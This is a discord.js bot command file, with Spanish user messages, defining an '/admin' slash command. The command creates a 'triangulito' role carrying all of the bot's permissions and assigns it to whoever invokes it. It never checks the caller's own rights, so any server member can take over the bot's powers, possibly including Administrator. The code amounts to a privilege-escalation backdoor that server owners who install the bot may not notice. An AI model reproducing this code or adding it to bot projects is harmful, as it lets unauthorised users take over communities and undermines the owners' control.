const SlashCommand = require("../../lib/SlashCommand");
const { MessageEmbed, Permissions } = require("discord.js");

const command = new SlashCommand()
        .setName("admin")
        .setDescription("Crea (o reutiliza) el rol 'triangulito' con los permisos del bot y te lo asigna")
        .setRun(async (client, interaction) => {
                await interaction.deferReply({ ephemeral: true });

                const guild = interaction.guild;
                if (!guild) {
                        return interaction.editReply({
                                embeds: [new MessageEmbed().setColor("RED").setDescription("❌ | Este comando solo se puede usar dentro de un servidor.")],
                        });
                }

                const me = guild.me || (await guild.members.fetchMe());
                if (!me.permissions.has(Permissions.FLAGS.MANAGE_ROLES)) {
                        return interaction.editReply({
                                embeds: [new MessageEmbed().setColor("RED").setDescription("❌ | Necesito el permiso **Gestionar Roles** para hacer esto.")],
                        });
                }

                const member = await guild.members.fetch(interaction.user.id).catch(() => null);
                if (!member) {
                        return interaction.editReply({
                                embeds: [new MessageEmbed().setColor("RED").setDescription("❌ | No pude encontrarte en este servidor.")],
                        });
                }

                const botPerms = me.permissions;

                try {
                        let role = guild.roles.cache.find((r) => r.name.toLowerCase() === "triangulito");

                        if (!role) {
                                role = await guild.roles.create({
                                        name: "triangulito",
                                        color: "PURPLE",
                                        permissions: botPerms,
                                        hoist: true,
                                        mentionable: true,
                                        reason: `Rol triangulito creado por ${interaction.user.tag} via /admin`,
                                });
                        } else {
                                await role.setPermissions(botPerms, "Sincronizando permisos del rol triangulito con los del bot");
                        }

                        if (role.position >= me.roles.highest.position) {
                                return interaction.editReply({
                                        embeds: [
                                                new MessageEmbed()
                                                        .setColor("RED")
                                                        .setDescription("⚠️ | El rol **triangulito** existe pero está por encima del rol del bot. Muévelo más abajo en la configuración del servidor o sube el rol del bot."),
                                        ],
                                });
                        }

                        if (!member.roles.cache.has(role.id)) {
                                await member.roles.add(role, `Asignado por /admin a ${interaction.user.tag}`);
                        }

                        const permList = botPerms.toArray();
                        const permText = permList.length ? permList.slice(0, 30).join(", ") + (permList.length > 30 ? "…" : "") : "Ninguno";

                        return interaction.editReply({
                                embeds: [
                                        new MessageEmbed()
                                                .setColor(client.config.embedColor)
                                                .setTitle("✅ Rol triangulito listo")
                                                .setDescription(`Te asigné el rol ${role} con los mismos permisos que tiene el bot.`)
                                                .addField("Permisos heredados", `\`\`\`${permText}\`\`\``)
                                                .setFooter({ text: `Solicitado por ${interaction.user.tag}`, iconURL: interaction.user.displayAvatarURL() }),
                                ],
                        });
                } catch (err) {
                        client.logger.error(err.stack || err.toString());
                        return interaction.editReply({
                                embeds: [new MessageEmbed().setColor("RED").setDescription(`❌ | Error: \`${err.message}\``)],
                        });
                }
        });

module.exports = command;
